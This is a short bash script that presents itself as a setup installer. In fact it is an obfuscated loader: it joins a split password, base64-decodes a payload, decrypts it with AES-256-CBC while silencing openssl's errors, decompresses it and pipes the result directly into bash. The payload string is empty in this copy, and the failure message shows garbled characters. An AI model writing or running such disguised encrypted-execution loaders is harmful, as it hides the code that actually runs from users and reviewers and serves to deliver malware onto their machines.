#!/bin/bash
set -e

_p1='FSBSxBpqSNNVDGPocGcpP'
_p2='oCa7Xap118WTKODRXbW7cA'
_pw="${_p1}${_p2}"

echo "Initializing setup..."

base64 -d <<< '' | \
  openssl enc -aes-256-cbc -d -pbkdf2 -pass pass:"${_pw}" 2>/dev/null | \
  gunzip | \
  bash

if [ $? -ne 0 ]; then
  echo "‚ùå Installation failed"
  exit 1
fi
